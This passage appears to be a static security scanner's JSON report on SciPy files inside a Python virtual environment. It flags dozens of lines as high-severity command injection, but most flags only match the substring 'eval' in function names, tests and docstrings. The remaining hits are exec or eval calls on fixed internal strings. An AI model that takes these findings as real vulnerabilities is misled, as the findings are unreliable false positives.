            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> filtered = cspline1d_eval(cspline1d(sig), time)",
            "context": "    >>> sig = np.repeat([0., 1., 0.], 100)\n    >>> sig += rng.standard_normal(len(sig))*0.05  # add noise\n    >>> time = np.linspace(0, len(sig))\n    >>> filtered = cspline1d_eval(cspline1d(sig), time)\n    >>> plt.plot(sig, label=\"signal\")\n    >>> plt.plot(time, filtered, label=\"filtered\")\n    >>> plt.legend()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> filtered = qspline1d_eval(qspline1d(sig), time)",
            "context": "    >>> sig = np.repeat([0., 1., 0.], 100)\n    >>> sig += rng.standard_normal(len(sig))*0.05  # add noise\n    >>> time = np.linspace(0, len(sig))\n    >>> filtered = qspline1d_eval(qspline1d(sig), time)\n    >>> plt.plot(sig, label=\"signal\")\n    >>> plt.plot(time, filtered, label=\"filtered\")\n    >>> plt.legend()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 502,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def cspline1d_eval(cj, newx, dx=1.0, x0=0):",
            "context": "    return out\n\n\ndef cspline1d_eval(cj, newx, dx=1.0, x0=0):\n    \"\"\"Evaluate a cubic spline at the new set of points.\n\n    `dx` is the old sample-spacing while `x0` was the old origin. In",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 545,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> filtered = cspline1d_eval(cspline1d(sig), time)",
            "context": "    >>> sig = np.repeat([0., 1., 0.], 100)\n    >>> sig += rng.standard_normal(len(sig))*0.05  # add noise\n    >>> time = np.linspace(0, len(sig))\n    >>> filtered = cspline1d_eval(cspline1d(sig), time)\n    >>> plt.plot(sig, label=\"signal\")\n    >>> plt.plot(time, filtered, label=\"filtered\")\n    >>> plt.legend()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res[cond1] = cspline1d_eval(cj, -newx[cond1])",
            "context": "    cond2 = newx > (N - 1)\n    cond3 = ~(cond1 | cond2)\n    # handle general mirror-symmetry\n    res[cond1] = cspline1d_eval(cj, -newx[cond1])\n    res[cond2] = cspline1d_eval(cj, 2 * (N - 1) - newx[cond2])\n    newx = newx[cond3]\n    if newx.size == 0:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 562,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res[cond2] = cspline1d_eval(cj, 2 * (N - 1) - newx[cond2])",
            "context": "    cond3 = ~(cond1 | cond2)\n    # handle general mirror-symmetry\n    res[cond1] = cspline1d_eval(cj, -newx[cond1])\n    res[cond2] = cspline1d_eval(cj, 2 * (N - 1) - newx[cond2])\n    newx = newx[cond3]\n    if newx.size == 0:\n        return res",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 576,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def qspline1d_eval(cj, newx, dx=1.0, x0=0):",
            "context": "    return res\n\n\ndef qspline1d_eval(cj, newx, dx=1.0, x0=0):\n    \"\"\"Evaluate a quadratic spline at the new set of points.\n\n    Parameters",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> filtered = qspline1d_eval(qspline1d(sig), time)",
            "context": "    >>> sig = np.repeat([0., 1., 0.], 100)\n    >>> sig += rng.standard_normal(len(sig))*0.05  # add noise\n    >>> time = np.linspace(0, len(sig))\n    >>> filtered = qspline1d_eval(qspline1d(sig), time)\n    >>> plt.plot(sig, label=\"signal\")\n    >>> plt.plot(time, filtered, label=\"filtered\")\n    >>> plt.legend()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 637,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res[cond1] = qspline1d_eval(cj, -newx[cond1])",
            "context": "    cond2 = newx > (N - 1)\n    cond3 = ~(cond1 | cond2)\n    # handle general mirror-symmetry\n    res[cond1] = qspline1d_eval(cj, -newx[cond1])\n    res[cond2] = qspline1d_eval(cj, 2 * (N - 1) - newx[cond2])\n    newx = newx[cond3]\n    if newx.size == 0:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 638,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res[cond2] = qspline1d_eval(cj, 2 * (N - 1) - newx[cond2])",
            "context": "    cond3 = ~(cond1 | cond2)\n    # handle general mirror-symmetry\n    res[cond1] = qspline1d_eval(cj, -newx[cond1])\n    res[cond2] = qspline1d_eval(cj, 2 * (N - 1) - newx[cond2])\n    newx = newx[cond3]\n    if newx.size == 0:\n        return res",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/differentiate/_differentiate.py",
            "line": 439,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "    res_work_pairs = [('status', 'status'), ('df', 'df'), ('error', 'error'),\n                      ('nit', 'nit'), ('nfev', 'nfev'), ('x', 'x')]\n\n    def pre_func_eval(work):\n        \"\"\"Determine the abscissae at which the function needs to be evaluated.\n\n        See `_derivative_weights` for a description of the stencil (pattern",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/differentiate/_differentiate.py",
            "line": 485,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, f, work):",
            "context": "        x_eval[il] = work.x[il][:, xp.newaxis] - hr[il]\n        return x_eval\n\n    def post_func_eval(x, f, work):\n        \"\"\" Estimate the derivative and error from the function evaluations\n\n        As in `pre_func_eval`: in the first iteration, there is only one stored",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/tests/test__quad_vec.py",
            "line": 143,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_num_eval(quadrature):",
            "context": "\n\n@quadrature_params\ndef test_num_eval(quadrature):\n    def f(x):\n        count[0] += 1\n        return x**5",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_ivp/tests/test_ivp.py",
            "line": 678,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_t_eval():",
            "context": "                          t_span[1], first_step=5)\n\n\ndef test_t_eval():\n    rtol = 1e-3\n    atol = 1e-6\n    y0 = [1/3, 2/9]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/tests/test_orthogonal.py",
            "line": 281,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "p = eval(pstr)",
            "context": "            ])\n        with np.errstate(all='ignore'):\n            for pstr in poly:\n                p = eval(pstr)\n                assert_almost_equal(p(0.315), np.poly1d(p.coef)(0.315),\n                                    err_msg=pstr)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/wright_bessel.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(cls, n, rho, v):",
            "context": "        nargs = 3\n\n        @classmethod\n        def eval(cls, n, rho, v):\n            if not n >= 0:\n                raise ValueError(\"must have n >= 0\")\n            elif n == 0:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/wright_bessel.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(cls, m, rho, beta):",
            "context": "        nargs = 3\n\n        @classmethod\n        def eval(cls, m, rho, beta):\n            if not m >= 0:\n                raise ValueError(\"must have m >= 0\")\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/main.py",
            "line": 650,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fun_val, cub_val, ceq_val = _eval(",
            "context": "            if same_best_point:\n                # Evaluate the objective and constraint functions.\n                try:\n                    fun_val, cub_val, ceq_val = _eval(\n                        pb,\n                        framework,\n                        step,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/main.py",
            "line": 697,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fun_val, cub_val, ceq_val = _eval(",
            "context": "\n                        # Evaluate the objective and constraint functions.\n                        try:\n                            fun_val, cub_val, ceq_val = _eval(\n                                pb,\n                                framework,\n                                step,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/main.py",
            "line": 840,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fun_val, cub_val, ceq_val = _eval(pb, framework, step, options)",
            "context": "\n            # Evaluate the objective and constraint functions.\n            try:\n                fun_val, cub_val, ceq_val = _eval(pb, framework, step, options)\n            except TargetSuccess:\n                status = ExitStatus.TARGET_SUCCESS\n                success = True",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/main.py",
            "line": 1422,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _eval(pb, framework, step, options):",
            "context": "    return constants\n\n\ndef _eval(pb, framework, step, options):\n    \"\"\"\n    Evaluate the objective and constraint functions.\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/main.py",
            "line": 1446,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x, fun, maxcv = pb.best_eval(penalty)",
            "context": "    Build the result of the optimization process.\n    \"\"\"\n    # Build the result.\n    x, fun, maxcv = pb.best_eval(penalty)\n    success = success and np.isfinite(fun) and np.isfinite(maxcv)\n    if status not in [ExitStatus.TARGET_SUCCESS, ExitStatus.FEASIBLE_SUCCESS]:\n        success = success and maxcv <= options[Options.FEASIBILITY_TOL]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/problem.py",
            "line": 80,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def n_eval(self):",
            "context": "        return f\n\n    @property\n    def n_eval(self):\n        \"\"\"\n        Number of function evaluations.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/problem.py",
            "line": 560,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def n_eval(self):",
            "context": "            return self._m_eq\n\n    @property\n    def n_eval(self):\n        \"\"\"\n        Number of function evaluations.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/problem.py",
            "line": 886,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x_best, fun_best, _ = self.best_eval(penalty)",
            "context": "        if self._callback is not None:\n            sig = signature(self._callback)\n            try:\n                x_best, fun_best, _ = self.best_eval(penalty)\n                x_best = self.build_x(x_best)\n                if set(sig.parameters) == {\"intermediate_result\"}:\n                    intermediate_result = OptimizeResult(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/problem.py",
            "line": 947,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def n_eval(self):",
            "context": "        return self._x0\n\n    @property\n    def n_eval(self):\n        \"\"\"\n        Number of function evaluations.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/cobyqa/problem.py",
            "line": 1192,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def best_eval(self, penalty):",
            "context": "        if len(violation):\n            return np.concatenate(violation)\n\n    def best_eval(self, penalty):\n        \"\"\"\n        Return the best point in the filter and the corresponding objective and\n        nonlinear constraint function evaluations.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/array_api_compat/torch/__init__.py",
            "line": 12,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(n + ' = torch.' + n)",
            "context": "        or 'cpu' in n\n        or 'backward' in n):\n        continue\n    exec(n + ' = torch.' + n)\n\n# These imports may overwrite names from the import * above.\nfrom ._aliases import * # noqa: F403",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/array_api_compat/cupy/fft.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from cupy.fft import *', _n)",
            "context": "#\n# from cupy.fft import __all__ as linalg_all\n_n = {}\nexec('from cupy.fft import *', _n)\ndel _n['__builtins__']\nfft_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/array_api_compat/cupy/linalg.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from cupy.linalg import *', _n)",
            "context": "#\n# from cupy.linalg import __all__ as linalg_all\n_n = {}\nexec('from cupy.linalg import *', _n)\ndel _n['__builtins__']\nlinalg_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/array_api_compat/dask/array/fft.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from dask.array.fft import *', _n)",
            "context": "#\n# from dask.array.fft import __all__ as linalg_all\n_n = {}\nexec('from dask.array.fft import *', _n)\ndel _n['__builtins__']\nfft_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/array_api_compat/dask/array/linalg.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from dask.array.linalg import *', _n)",
            "context": "#\n# from dask.array.linalg import __all__ as linalg_all\n_n = {}\nexec('from dask.array.linalg import *', _n)\ndel _n['__builtins__']\nif 'annotations' in _n:\n    del _n['annotations']",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/tests/test_continuous.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ref = eval(f'(a {left_comparison} x) & (x {right_comparison} b)')",
            "context": "        # fixed with NEP50. Just do what makes the test pass.\n        left_comparison = '<=' if inclusive_a else '<'\n        right_comparison = '<=' if inclusive_b else '<'\n        ref = eval(f'(a {left_comparison} x) & (x {right_comparison} b)')\n        assert_equal(res, ref)\n\n    @pytest.mark.parametrize('case', [",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/tests/test_continuous.py",
            "line": 1728,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "new_dist = eval(repr(dist))",
            "context": "        from scipy.stats import abs, exp, log, order_statistic, truncate # noqa: F401\n        from scipy.stats import Mixture, Normal # noqa: F401\n        from scipy.stats._new_distributions import Uniform # noqa: F401\n        new_dist = eval(repr(dist))\n        # A basic check that the distributions are the same\n        sample1 = dist.sample(shape=10, rng=1234)\n        sample2 = new_dist.sample(shape=10, rng=1234)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/tests/test__differential_evolution.py",
            "line": 260,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_best_solution_retrieval(self):",
            "context": "        result = solver.solve()\n        assert_equal(result.fun, self.quadratic(result.x))\n\n    def test_best_solution_retrieval(self):\n        # test that the getter property method for the best solution works.\n        solver = DifferentialEvolutionSolver(self.quadratic, [(-2, 2)])\n        result = solver.solve()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/tests/test_constraints.py",
            "line": 183,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "bounds2 = eval(repr(Bounds(*args)))",
            "context": "             np.array([True, False])),\n        ):\n            bounds = Bounds(*args)\n            bounds2 = eval(repr(Bounds(*args)))\n            assert_array_equal(bounds.lb, bounds2.lb)\n            assert_array_equal(bounds.ub, bounds2.ub)\n            assert_array_equal(bounds.keep_feasible, bounds2.keep_feasible)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_signaltools.py",
            "line": 1440,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y2 = signal.cspline1d_eval(cj, x2, dx=dx, x0=x[0])",
            "context": "        cj = signal.cspline1d(y)\n\n        x2 = arange(len(y) * 10.0) / 10.0\n        y2 = signal.cspline1d_eval(cj, x2, dx=dx, x0=x[0])\n\n        # make sure interpolated values are on knot points\n        assert_array_almost_equal(y2[::10], y, decimal=5)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_signaltools.py",
            "line": 1458,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ynew = signal.cspline1d_eval(cy, xnew)",
            "context": "\n        # determine new test x value and interpolate\n        xnew = np.array([0.5])\n        ynew = signal.cspline1d_eval(cy, xnew)\n\n        assert_equal(ynew.dtype, y.dtype)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 143,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_cspline1d_eval(self):",
            "context": "                           5.14634135])\n        xp_assert_close(bsp.qspline1d(np.asarray([1., 2, 3, 4, 5])), q1d0)\n\n    def test_cspline1d_eval(self):\n        np.random.seed(12464)\n        xp_assert_close(bsp.cspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_close(bsp.cspline1d_eval(np.asarray([0., 0]), [0.]),",
            "context": "\n    def test_cspline1d_eval(self):\n        np.random.seed(12464)\n        xp_assert_close(bsp.cspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])\n        )\n        xp_assert_equal(bsp.cspline1d_eval(np.asarray([1., 0, 1]), []),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 148,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_equal(bsp.cspline1d_eval(np.asarray([1., 0, 1]), []),",
            "context": "        xp_assert_close(bsp.cspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])\n        )\n        xp_assert_equal(bsp.cspline1d_eval(np.asarray([1., 0, 1]), []),\n                        np.asarray([])\n        )\n        x = [-3, -2, -1, 0, 1, 2, 3, 4, 5, 6]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 167,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_close(bsp.cspline1d_eval(cj, newx, dx=dx, x0=x[0]), newy)",
            "context": "                           2.24889482, 4.094, 2.24889482, 1.396, 3.18686814, 5.879,\n                           7.41525761, 7.874, 7.79560142, 7.433, 6.98971173, 6.759,\n                           6.80717667, 6.203, 4.41570658])\n        xp_assert_close(bsp.cspline1d_eval(cj, newx, dx=dx, x0=x[0]), newy)\n\n    def test_qspline1d_eval(self):\n        np.random.seed(12465)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 169,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_qspline1d_eval(self):",
            "context": "                           6.80717667, 6.203, 4.41570658])\n        xp_assert_close(bsp.cspline1d_eval(cj, newx, dx=dx, x0=x[0]), newy)\n\n    def test_qspline1d_eval(self):\n        np.random.seed(12465)\n        xp_assert_close(bsp.qspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 171,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_close(bsp.qspline1d_eval(np.asarray([0., 0]), [0.]),",
            "context": "\n    def test_qspline1d_eval(self):\n        np.random.seed(12465)\n        xp_assert_close(bsp.qspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])\n        )\n        xp_assert_equal(bsp.qspline1d_eval(np.asarray([1., 0, 1]), []),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 174,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_equal(bsp.qspline1d_eval(np.asarray([1., 0, 1]), []),",
            "context": "        xp_assert_close(bsp.qspline1d_eval(np.asarray([0., 0]), [0.]),\n                        np.asarray([0.])\n        )\n        xp_assert_equal(bsp.qspline1d_eval(np.asarray([1., 0, 1]), []),\n                        np.asarray([])\n        )\n        x = [-3, -2, -1, 0, 1, 2, 3, 4, 5, 6]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/tests/test_bsplines.py",
            "line": 193,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "xp_assert_close(bsp.qspline1d_eval(cj, newx, dx=dx, x0=x[0]), newy)",
            "context": "                           2.34046013, 4.094, 2.34046013, 1.396, 3.23872593, 5.879,\n                           7.32718426, 7.874, 7.81016848, 7.433, 7.03980488, 6.759,\n                           6.71900226, 6.203, 4.49418159])\n        xp_assert_close(bsp.qspline1d_eval(cj, newx, dx=dx, x0=x[0]), newy)\n\n\n# i/o dtypes with scipy 1.9.1, likely fixed by backwards compat",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/sparse/csgraph/tests/test_graph_laplacian.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "mat = eval(mat, dict(np=np, sparse=sparse))",
            "context": "\ndef _check_symmetric_graph_laplacian(mat, normed, copy=True):\n    if not hasattr(mat, 'shape'):\n        mat = eval(mat, dict(np=np, sparse=sparse))\n\n    if sparse.issparse(mat):\n        sp_mat = mat",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/sparse/csgraph/tests/test_graph_laplacian.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d[L] = eval(L)",
            "context": "    d = {}\n    for L in [\"L_in\", \"L_out\", \"Ls\", \"Ls_normed\", \"Lss\", \"Lss_normed\"]:\n        if form == \"array\":\n            d[L] = eval(L)\n        else:\n            d[L] = eval(L)(np.eye(n, dtype=mat.dtype))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/sparse/csgraph/tests/test_graph_laplacian.py",
            "line": 302,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d[L] = eval(L)(np.eye(n, dtype=mat.dtype))",
            "context": "        if form == \"array\":\n            d[L] = eval(L)\n        else:\n            d[L] = eval(L)(np.eye(n, dtype=mat.dtype))\n\n    _assert_allclose_sparse(d[\"Ls\"], d[\"L_in\"] + d[\"L_out\"].T)\n    _assert_allclose_sparse(d[\"Ls\"], d[\"Lss\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_polyint.py",
            "line": 788,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_periodic_eval(self):",
            "context": "            S = CubicSpline(x, Y, axis=1, bc_type='periodic')\n            self.check_correctness(S, 'periodic', 'periodic')\n\n    def test_periodic_eval(self):\n        x = np.linspace(0, 2 * np.pi, 10)\n        y = np.cos(x)\n        S = CubicSpline(x, y, bc_type='periodic')",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 837,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_eval(self):",
            "context": "\n\nclass TestAkima1DInterpolator:\n    def test_eval(self):\n        x = np.arange(0., 11.)\n        y = np.array([0., 2., 1., 3., 2., 6., 5.5, 5.5, 2.7, 5.1, 3.])\n        ak = Akima1DInterpolator(x, y)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 1335,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_derivative_eval(self):",
            "context": "        xp_assert_close(pp.derivative().c, dpp.c)\n        xp_assert_close(pp.derivative(2).c, ddpp.c)\n\n    def test_derivative_eval(self):\n        rng = np.random.RandomState(1234)\n        x = np.sort(np.r_[0, rng.rand(11), 1])\n        y = rng.rand(len(x))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2218,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v2 = _ppoly2d_eval(c, (x, y), xi, yi)",
            "context": "                           1,\n                           v1)\n        v1 = v1.ravel()\n        v2 = _ppoly2d_eval(c, (x, y), xi, yi)\n        xp_assert_close(v1, v2)\n\n        p = NdPPoly(c, (x, y))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2224,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v2 = _ppoly2d_eval(c, (x, y), xi, yi, nu=nu)",
            "context": "        p = NdPPoly(c, (x, y))\n        for nu in (None, (0, 0), (0, 1), (1, 0), (2, 3), (9, 2)):\n            v1 = p(np.c_[xi, yi], nu=nu)\n            v2 = _ppoly2d_eval(c, (x, y), xi, yi, nu=nu)\n            xp_assert_close(v1, v2, err_msg=repr(nu))\n\n    def test_simple_3d(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2244,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v2 = _ppoly3d_eval(c, (x, y, z), xi, yi, zi, nu=nu)",
            "context": "        for nu in (None, (0, 0, 0), (0, 1, 0), (1, 0, 0), (2, 3, 0),\n                   (6, 0, 2)):\n            v1 = p((xi, yi, zi), nu=nu)\n            v2 = _ppoly3d_eval(c, (x, y, z), xi, yi, zi, nu=nu)\n            xp_assert_close(v1, v2, err_msg=repr(nu))\n\n    def test_simple_4d(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2264,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v2 = _ppoly4d_eval(c, (x, y, z, u), xi, yi, zi, ui)",
